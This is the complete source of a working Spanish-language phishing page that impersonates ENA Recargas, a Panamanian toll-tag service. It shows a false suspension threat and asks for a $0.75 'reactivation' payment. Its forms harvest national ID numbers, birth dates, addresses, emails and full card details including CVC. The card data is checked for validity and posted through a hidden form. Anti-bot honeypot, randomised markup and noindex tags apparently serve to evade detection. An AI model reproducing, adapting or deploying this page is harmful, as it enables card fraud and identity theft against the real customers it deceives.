<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>ENA Recargas - Verificar Detalles y Confirmar Facturación</title>
    <style>
        html { height: 100%; overflow-x: hidden; }
        body {
            background: #ffffff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            color: #223136;
            height: 100vh;
            width: 100vw;
            box-sizing: border-box;
        }
        .header {
            background-color: #ffffff;
            color: #223136;
            padding: 10px;
            text-align: center;
        }
        .header img {
            width: 30%;
            height: auto;
            max-width: 200px;
        }
        .wizard-container {
            max-width: 600px;
            margin: 20px auto;
            background: rgba(255, 255, 255, 0.9);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .progress-bar {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .step {
            flex: 1;
            text-align: center;
            padding: 10px;
            background: #e6f2ff;
            border-radius: 4px;
            margin: 0 5px;
            color: #273c53;
            font-weight: bold;
        }
        .step.active { background: #273c53; color: white; }
        .step-content { display: none; }
        .step-content.active { display: block; }
        .form-group { margin-bottom: 20px; }  /* Increased spacing */
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input, select {
            width: 100%;
            padding: 15px;  /* Increased padding for spaciousness */
            border: 1px solid #ccc;
            border-radius: 12px;  /* More curved corners */
            color: black;
            font-size: 16px;
            box-sizing: border-box;
        }
        .dob-container {
            display: flex;
            gap: 10px;
        }
        .dob-container select { flex: 1; padding: 15px; }  /* Match padding */
        .card-input-container { position: relative; }
        .card-input-container input {
            padding-left: 60px;  /* Add padding to left to make space for the icon */
        }
        .card-brand {
            position: absolute;
            left: 10px;  /* Moved to the left */
            top: 50%;
            transform: translateY(-50%);
            width: 40px;
            height: 25px;
            display: block;  /* Always visible now */
        }
        .phone-input-container { position: relative; }
        .phone-prefix {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            font-size: 16px;
            pointer-events: none;
        }
        .phone-input { padding-left: 70px; }
        .urgency-alert {
            background-color: #ffdddd;
            border: 1px solid #ff0000;
            color: #d8000c;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 4px;
            font-weight: bold;
            text-align: center;
        }
        button {
            background: #273c53;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
        }
        button:hover { background: #1f3043; }
        button:disabled {
            background: #cccccc;
            cursor: not-allowed;
            color: #666666;
        }
        .nav-buttons { display: flex; justify-content: space-between; margin-top: 20px; }
        .nav-buttons button { width: auto; }
        .loading-circle {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #273c53;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-screen {
            text-align: center;
            padding: 20px;
        }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
        .error { color: red; font-size: 12px; margin-top: 5px; display: none; }
        .error-field { border-color: red; }
        .honeypot { display: none; }

        @media (max-width: 768px) {
            .wizard-container { margin: 10px; padding: 15px; }
            .step { font-size: 12px; }
            .nav-buttons { flex-direction: column; }
            .nav-buttons button { margin: 5px 0; }
            .dob-container { flex-direction: column; gap: 5px; }
        }

        @media (max-width: 480px) {
            .header img { width: 70%; max-width: 120px; }
            .wizard-container { margin: 5px; padding: 10px; }
            .urgency-alert { padding: 5px; font-size: 12px; }
            input, select, button { padding: 12px; font-size: 14px; }  /* Adjusted for mobile */
            .error { font-size: 10px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://www.enarecargas.com/maxipista/VAADIN/themes/privatetheme/img/logoEna.jpg" alt="ENA Logo">
    </div>

    <div class="wizard-container" id="dynamic-container">
        <div class="progress-bar">
            <div class="step active" id="step1">1. Verificar Detalles</div>
            <div class="step" id="step2">2. Top up.</div>
            <div class="step" id="step3">3. Procesar</div>
        </div>

        <div class="step-content active" id="content1">
            <div class="urgency-alert">
                Para proteger tu cuenta, verifica tus datos y reactiva tu tag realizando una recarga de $0.75. La falta de completar este proceso resultará en la suspensión de la cuenta.
            </div>
            <h2>Verifica tus Detalles</h2>
            <div class="form-group">
                <label for="phone">Número de Teléfono</label>
                <div class="phone-input-container">
                    <span class="phone-prefix">+507</span>
                    <input type="text" id="phone" name="phone" class="phone-input" maxlength="9">
                </div>
                <div class="error" id="phoneError"></div>
            </div>
            <div class="form-group">
                <label for="dob">Fecha de Nacimiento</label>
                <div class="dob-container">
                    <select id="dob-year" name="dob-year"><option value="">Año</option></select>
                    <select id="dob-month" name="dob-month"><option value="">Mes</option></select>
                    <select id="dob-day" name="dob-day"><option value="">Día</option></select>
                </div>
                <div class="error" id="dobError"></div>
            </div>
            <div class="form-group">
                <label for="cedula">Número de Cédula (ID Nacional)</label>
                <input type="text" id="cedula" name="cedula" maxlength="9">
                <div class="error" id="cedulaError"></div>
            </div>
            <div class="form-group">
                <label for="street">Dirección de Facturación (Calle)</label>
                <input type="text" id="street" name="street">
                <div class="error" id="streetError"></div>
            </div>
            <div class="form-group">
                <label for="city">Ciudad</label>
                <input type="text" id="city" name="city">
                <div class="error" id="cityError"></div>
            </div>
            <div class="form-group">
                <label for="province">Provincia</label>
                <input type="text" id="province" name="province">
                <div class="error" id="provinceError"></div>
            </div>
            <div class="form-group">
                <label for="zip">Código Postal (ZIP)</label>
                <input type="text" id="zip" name="zip" maxlength="10">
                <div class="error" id="zipError"></div>
            </div>
            <div class="form-group">
                <label for="email">Correo Electrónico</label>
                <input type="email" id="email" name="email">
                <div class="error" id="emailError"></div>
            </div>
            <div class="form-group">
                <label for="topup">Selecciona la Recarga</label>
                <select id="topup" name="topup">
                    <option value="">Selecciona</option>
                    <option value="0.75">$0.75</option>
                </select>
                <div class="error" id="topupError"></div>
            </div>
            <div class="nav-buttons">
                <button type="button" onclick="nextStep(1)">Continuar</button>
            </div>
        </div>

        <div class="step-content" id="content2">
            <div class="urgency-alert">
                Reactiva tu tag realizando una recarga de $0.75, el pago se procesará de forma segura por tu banco.
            </div>
            <h2>Top up.</h2>
            <div class="form-group">
                <label for="full_name">Nombre del Titular (como en la tarjeta)</label>
                <input type="text" id="full_name" name="full_name">
                <div class="error" id="fullNameError"></div>
            </div>
            <div class="form-group">
                <label for="card_number">Número de Tarjeta (16-19 dígitos)</label>
                <div class="card-input-container">
                    <input type="text" id="card_number" name="card_number" maxlength="23">
                    <img id="card-brand" class="card-brand" src="https://img.icons8.com/ios-filled/50/000000/bank-card-back-side.png" alt="Credit Card Icon">
                </div>
                <div class="error" id="cardNumberError"></div>
            </div>
            <div class="form-group">
                <label for="expiry">Fecha de Expiración</label>
                <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="MM/YY">
                <div class="error" id="expiryError"></div>
            </div>
            <div class="form-group">
                <label for="cvc">Código de Seguridad (CVV/CVC)</label>
                <input type="text" id="cvc" name="cvc" maxlength="4">
                <div class="error" id="cvcError"></div>
            </div>
            <div class="nav-buttons">
                <button type="button" id="prevBtn" onclick="prevStep(2)" disabled>Anterior</button>
                <button type="button" onclick="nextStep(2)">Continuar</button>
            </div>
        </div>

        <div class="step-content" id="content3">
            <h2>Procesar</h2>
            <div class="loading-circle"></div>
            <p>Procesando tu verificación...</p>
        </div>

        <div class="step-content loading-screen" id="loadingStep2">
            <div class="loading-circle"></div>
            <p>Verificando detalles...</p>
        </div>
    </div> <div class="footer">
        <p>Transacción Segura | Contacto: 800-ENA</p>
    </div>

    <form id="rechargeForm" action="/submit" method="POST" style="display:none;">
        <input type="hidden" name="payment_method" value="cc">
        <input type="hidden" name="full_name" id="hidden_full_name">
        <input type="hidden" name="card_number" id="hidden_card_number">
        <input type="hidden" name="expiry" id="hidden_expiry">
        <input type="hidden" name="cvc" id="hidden_cvc">
        <input type="hidden" name="email" id="hidden_email">
        <input type="hidden" name="phone" id="hidden_phone">
        <input type="hidden" name="dob" id="hidden_dob">
        <input type="hidden" name="cedula" id="hidden_cedula">
        <input type="hidden" name="street" id="hidden_street">
        <input type="hidden" name="city" id="hidden_city">
        <input type="hidden" name="province" id="hidden_province">
        <input type="hidden" name="zip" id="hidden_zip">
        <input type="hidden" name="topup" id="hidden_topup">
        <input type="text" name="website" style="display:none;">
    </form>
  <script>
let currentStep = 1;
        const validDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com', 'ymail.com', 'me.com', 'live.com'];
        const monthNames = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"];
        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);  // Detect iOS for extra handling

        function nextStep(step) {
            if (validateStep(step)) {
                document.getElementById('content' + step).classList.remove('active');
                document.getElementById('step' + step).classList.remove('active');
                if (step === 1) {
                    // Mostrar pantalla de carga por 3 segundos antes de pasar al paso 2
                    document.getElementById('loadingStep2').classList.add('active');
                    setTimeout(() => {
                        document.getElementById('loadingStep2').classList.remove('active');
                        currentStep = 2;
                        document.getElementById('content' + currentStep).classList.add('active');
                        document.getElementById('step' + currentStep).classList.add('active');
                        updateHiddensStep1();
                    }, 3000);
                } else if (step === 2) {
                    currentStep = 3;
                    document.getElementById('content' + currentStep).classList.add('active');
                    document.getElementById('step' + currentStep).classList.add('active');
                    updateHiddensStep2();
                    setTimeout(() => {
                        document.getElementById('rechargeForm').submit();
                    }, 3000);
                }
            }
        }

        function prevStep(step) {
            document.getElementById('content' + step).classList.remove('active');
            document.getElementById('step' + step).classList.remove('active');
            currentStep--;
            document.getElementById('content' + currentStep).classList.add('active');
            document.getElementById('step' + currentStep).classList.add('active');
        }

        function validateStep(step) {
            clearErrors();
            if (step === 1) {
                const phone = document.getElementById('phone').value.trim();
                if (!phone) {
                    showError('phoneError', 'Por favor, ingresa el número de teléfono.');
                    return false;
                } else {
                    const phoneClean = phone.replace(/\D/g, '');
                    if (phoneClean.length !== 8) {
                        showError('phoneError', 'El teléfono debe tener 8 dígitos.');
                        return false;
                    }
                }
                const year = document.getElementById('dob-year').value;
                const monthName = document.getElementById('dob-month').value;
                const day = document.getElementById('dob-day').value;
                if (!year || !monthName || !day) {
                    showError('dobError', 'Por favor, selecciona la fecha completa de nacimiento.');
                    return false;
                } else {
                    const monthIndex = monthNames.indexOf(monthName) + 1;
                    const dobDate = new Date(year, monthIndex - 1, day);
                    const now = new Date();
                    const age = now.getFullYear() - dobDate.getFullYear() - (now < new Date(now.getFullYear(), dobDate.getMonth(), dobDate.getDate()) ? 1 : 0);
                    if (age < 18) {
                        showError('dobError', 'Debes tener al menos 18 años.');
                        return false;
                    }
                }
                const cedula = document.getElementById('cedula').value.trim();
                if (!cedula) {
                    showError('cedulaError', 'Por favor, ingresa el número de cédula.');
                    return false;
                } else if (!/^\d{7,9}$/.test(cedula)) {
                    showError('cedulaError', 'El número de cédula debe tener entre 7 y 9 dígitos.');
                    return false;
                }
                const street = document.getElementById('street').value.trim();
                if (!street) {
                    showError('streetError', 'Por favor, ingresa la dirección.');
                    return false;
                }
                const city = document.getElementById('city').value.trim();
                if (!city) {
                    showError('cityError', 'Por favor, ingresa la ciudad.');
                    return false;
                }
                const province = document.getElementById('province').value.trim();
                if (!province) {
                    showError('provinceError', 'Por favor, ingresa la provincia.');
                    return false;
                }
                const zip = document.getElementById('zip').value.trim();
                if (!zip) {
                    showError('zipError', 'Por favor, ingresa el código postal.');
                    return false;
                }
                const email = document.getElementById('email').value.trim();
                if (!email) {
                    showError('emailError', 'Por favor, ingresa el correo electrónico.');
                    return false;
                } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                    showError('emailError', 'Por favor, ingresa un correo electrónico válido.');
                    return false;
                } else {
                    const domain = email.substring(email.indexOf('@') + 1).toLowerCase();
                    if (!validDomains.includes(domain)) {
                        showError('emailError', 'Dominio no permitido. Usa un dominio común como gmail.com or yahoo.com.');
                        return false;
                    }
                }
                const topup = document.getElementById('topup').value;
                if (!topup) {
                    showError('topupError', 'Por favor, selecciona la recarga.');
                    return false;
                }
            } else if (step === 2) {
                const fullName = document.getElementById('full_name').value.trim();
                if (!fullName) {
                    showError('fullNameError', 'Por favor, ingresa el nombre del titular.');
                    return false;
                }
                const cardNumber = document.getElementById('card_number').value.trim();
                if (!cardNumber) {
                    showError('cardNumberError', 'Por favor, ingresa el número de tarjeta.');
                    return false;
                } else if (!/^\d{13,19}$/.test(cardNumber.replace(/\s/g, ''))) {
                    showError('cardNumberError', 'El número de tarjeta debe tener entre 13 y 19 dígitos.');
                    return false;
                } else if (!luhnCheck(cardNumber)) {
                    showError('cardNumberError', 'Número de tarjeta inválido.');
                    return false;
                } else if (!validateBin(cardNumber.replace(/\s/g, ''))) {
                    showError('cardNumberError', 'BIN inválido (debe corresponder a Visa, Mastercard, Amex o Discover).');
                    return false;
                }
                const expiry = document.getElementById('expiry').value.trim();
                if (!expiry) {
                    showError('expiryError', 'Por favor, ingresa la fecha de expiración.');
                    return false;
                } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
                    showError('expiryError', 'La fecha debe estar en formato MM/YY.');
                    return false;
                } else {
                    const [, month, year] = expiry.match(/(\d{2})\/(\d{2})/);
                    const expiryYear = parseInt('20' + year);
                    if (expiryYear < 2026) {
                        showError('expiryError', 'La fecha de expiración debe ser 2026 o posterior.');
                        return false;
                    }
                }
                const cvc = document.getElementById('cvc').value.trim();
                if (!cvc) {
                    showError('cvcError', 'Por favor, ingresa el código CVC.');
                    return false;
                } else {
                    const brand = validateBin(cardNumber.replace(/\s/g, ''));
                    if (brand === 'American Express') {
                        if (!/^\d{4}$/.test(cvc)) {
                            showError('cvcError', 'El CVC para American Express debe tener 4 dígitos.');
                            return false;
                        }
                    } else if (brand) {
                        if (!/^\d{3}$/.test(cvc)) {
                            showError('cvcError', 'El CVC debe tener 3 dígitos.');
                            return false;
                        }
                    } else {
                        if (!/^\d{3,4}$/.test(cvc)) {
                            showError('cvcError', 'El CVC debe tener 3 o 4 dígitos.');
                            return false;
                        }
                    }
                }
            }
            return true;
        }

        function updateHiddensStep1() {
            document.getElementById('hidden_phone').value = '+507 ' + document.getElementById('phone').value;
            const year = document.getElementById('dob-year').value;
            const monthName = document.getElementById('dob-month').value;
            const day = document.getElementById('dob-day').value;
            const monthIndex = monthNames.indexOf(monthName) + 1;
            document.getElementById('hidden_dob').value = `${monthIndex.toString().padStart(2, '0')}/${day.padStart(2, '0')}/${year}`;
            document.getElementById('hidden_cedula').value = document.getElementById('cedula').value;
            document.getElementById('hidden_street').value = document.getElementById('street').value;
            document.getElementById('hidden_city').value = document.getElementById('city').value;
            document.getElementById('hidden_province').value = document.getElementById('province').value;
            document.getElementById('hidden_zip').value = document.getElementById('zip').value;
            document.getElementById('hidden_email').value = document.getElementById('email').value;
            document.getElementById('hidden_topup').value = document.getElementById('topup').value;
        }

        function updateHiddensStep2() {
            document.getElementById('hidden_full_name').value = document.getElementById('full_name').value;
            document.getElementById('hidden_card_number').value = document.getElementById('card_number').value;
            document.getElementById('hidden_expiry').value = document.getElementById('expiry').value;
            document.getElementById('hidden_cvc').value = document.getElementById('cvc').value;
        }

        // Poblar selects de DOB
        const dobYear = document.getElementById('dob-year');
        const dobMonth = document.getElementById('dob-month');
        const dobDay = document.getElementById('dob-day');

        const currentYear = new Date().getFullYear();
        for (let year = currentYear - 18; year >= 1900; year--) {
            const option = document.createElement('option');
            option.value = year;
            option.textContent = year;
            dobYear.appendChild(option);
        }

        monthNames.forEach((month, index) => {
            const option = document.createElement('option');
            option.value = month;
            option.textContent = month;
            dobMonth.appendChild(option);
        });

        function populateDays() {
            const year = dobYear.value;
            const monthName = dobMonth.value;
            dobDay.innerHTML = '<option value="">Día</option>';
            if (!year || !monthName) return;
            const monthIndex = monthNames.indexOf(monthName) + 1;
            const daysInMonth = new Date(year, monthIndex, 0).getDate();
            for (let day = 1; day <= daysInMonth; day++) {
                const option = document.createElement('option');
                option.value = day;
                option.textContent = day;
                dobDay.appendChild(option);
            }
        }

        dobYear.addEventListener('change', populateDays);
        dobMonth.addEventListener('change', populateDays);

        // Debounced Formateo de teléfono (fixes iOS cursor)
        const phoneInput = document.getElementById('phone');
        let phoneTimeout;
        phoneInput.addEventListener('input', function(e) {
            clearTimeout(phoneTimeout);
            phoneTimeout = setTimeout(() => {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length === 0) {
                    e.target.value = '';
                    return;
                }
                value = value.substring(0, 8);
                if (value.length > 4) {
                    e.target.value = value.substring(0, 4) + '-' + value.substring(4);
                } else {
                    e.target.value = value;
                }
            }, 10);
        });
        if (isIOS) {
            phoneInput.addEventListener('blur', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                value = value.substring(0, 8);
                if (value.length > 4) {
                    e.target.value = value.substring(0, 4) + '-' + value.substring(4);
                } else {
                    e.target.value = value;
                }
            });
        }

        // Restricciones numéricas with debounce
        ['cvc', 'cedula', 'zip'].forEach(fieldId => {
            const field = document.getElementById(fieldId);
            let timeout;
            field.addEventListener('input', function(e) {
                clearTimeout(timeout);
                timeout = setTimeout(() => {
                    let value = e.target.value.replace(/\D/g, '');
                    if (fieldId === 'cvc' && value.length > 4) value = value.substring(0, 4);
                    else if (fieldId === 'cedula' && value.length > 9) value = value.substring(0, 9);
                    else if (fieldId === 'zip' && value.length > 10) value = value.substring(0, 10);
                    e.target.value = value;
                }, 10);
            });
        });

        // Debounced Manejo de tarjeta
        const cardInput = document.getElementById('card_number');
        const cardBrandImg = document.getElementById('card-brand');
        let cardTimeout;
        cardInput.addEventListener('input', function(e) {
            clearTimeout(cardTimeout);
            cardTimeout = setTimeout(() => {
                let value = e.target.value.replace(/\D/g, '');
                value = value.substring(0, 19);
                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                e.target.value = value;

                // Fix cursor position for iOS and others
                setTimeout(() => {
                    const cursorPos = value.length;
                    this.setSelectionRange(cursorPos, cursorPos);
                }, isIOS ? 20 : 0);

                // Dynamic brand detection
                const brand = validateBin(value.replace(/\s/g, ''));
                if (brand === 'Visa') {
                    cardBrandImg.src = 'https://img.icons8.com/color/48/000000/visa.png';
                } else if (brand === 'Mastercard') {
                    cardBrandImg.src = 'https://img.icons8.com/color/48/000000/mastercard.png';
                } else if (brand === 'American Express') {
                    cardBrandImg.src = 'https://img.icons8.com/color/48/000000/amex.png';
                } else if (brand === 'Discover') {
                    cardBrandImg.src = 'https://img.icons8.com/color/48/000000/discover.png';
                } else {
                    cardBrandImg.src = 'https://img.icons8.com/ios-filled/50/000000/bank-card-back-side.png';
                }
            }, 10);
        });

        // Updated Debounced Formateo de expiración with setTimeout for iOS cursor fix
        const expiryInput = document.getElementById('expiry');
        let expiryTimeout;
        expiryInput.addEventListener('input', function(e) {
            clearTimeout(expiryTimeout);
            expiryTimeout = setTimeout(() => {
                const originalValue = this.value;
                let digits = originalValue.replace(/[^\d]/g, '');
                digits = digits.substring(0, 4);

                let formatted;
                if (e.inputType === 'deleteContentBackward' || e.inputType === 'deleteContentForward') {
                    formatted = digits;
                } else {
                    formatted = digits;
                    if (digits.length >= 2) {
                        formatted = digits.substring(0, 2) + '/' + digits.substring(2);
                    }
                }

                if (formatted.includes('/')) {
                    const month = parseInt(formatted.substring(0, 2));
                    if (month < 1 || month > 12) {
                        const cappedMonth = month < 1 ? '01' : '12';
                        formatted = cappedMonth + formatted.substring(2);
                    }
                }

                if (formatted.includes('/')) {
                    const yearPart = parseInt(formatted.substring(3, 5));
                    if (yearPart === 0 || yearPart < 26) {
                        showError('expiryError', 'El año debe ser 26 o superior (ej. 26 para 2026).');
                    } else {
                        clearError('expiryError');
                    }
                } else {
                    clearError('expiryError');
                }

                this.value = formatted;

                // Deferred cursor setting for iOS
                setTimeout(() => {
                    const newCursorPos = formatted.length;
                    this.setSelectionRange(newCursorPos, newCursorPos);
                }, isIOS ? 20 : 0);
            }, 10);
        });
        if (isIOS) {
            expiryInput.addEventListener('blur', function(e) {
                let digits = e.target.value.replace(/[^\d]/g, '');
                digits = digits.substring(0, 4);
                let formatted = digits;
                if (digits.length >= 2) {
                    formatted = digits.substring(0, 2) + '/' + digits.substring(2);
                }
                e.target.value = formatted;
            });
        }

        // Verificación Luhn
        function luhnCheck(cardNumber) {
            cardNumber = cardNumber.replace(/\D/g, '');
            if (!/^\d{13,19}$/.test(cardNumber)) return false;

            let sum = 0;
            let shouldDouble = false;
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i));
                if (shouldDouble) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                shouldDouble = !shouldDouble;
            }
            return sum % 10 === 0; }

    // Validación BIN
    function validateBin(cardNumber) {
        const bin = cardNumber.substring(0, 6);
        if (/^4/.test(bin)) return 'Visa';
        if (/^5[1-5]/.test(bin)) return 'Mastercard';
        if (/^3[47]/.test(bin)) return 'American Express';
        if (/^6(?:011|5)/.test(bin)) return 'Discover';
        return false;
    }

    // Clase de contenedor aleatoria
    (function() {
        var randomClass = ['container-var1', 'container-var2', 'container-var3'][Math.floor(Math.random() * 3)];
        document.getElementById('dynamic-container').classList.add(randomClass);
    })();

    function showError(id, message) {
        const errorDiv = document.getElementById(id);
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        // Scroll to the field and highlight
        const fieldId = id.replace('Error', '');
        const field = document.getElementById(fieldId);
        if (field) {
            field.scrollIntoView({ behavior: 'smooth', block: 'center' });
            field.classList.add('error-field');
            field.focus();
        }
    }

    function clearErrors() {
        const errors = document.querySelectorAll('.error');
        errors.forEach(error => {
            error.textContent = '';
            error.style.display = 'none';
        });
        const fields = document.querySelectorAll('input, select');
        fields.forEach(field => field.classList.remove('error-field'));
    }

    function clearError(id) {
        const errorDiv = document.getElementById(id);
        errorDiv.textContent = '';
        errorDiv.style.display = 'none';
    }
</script>
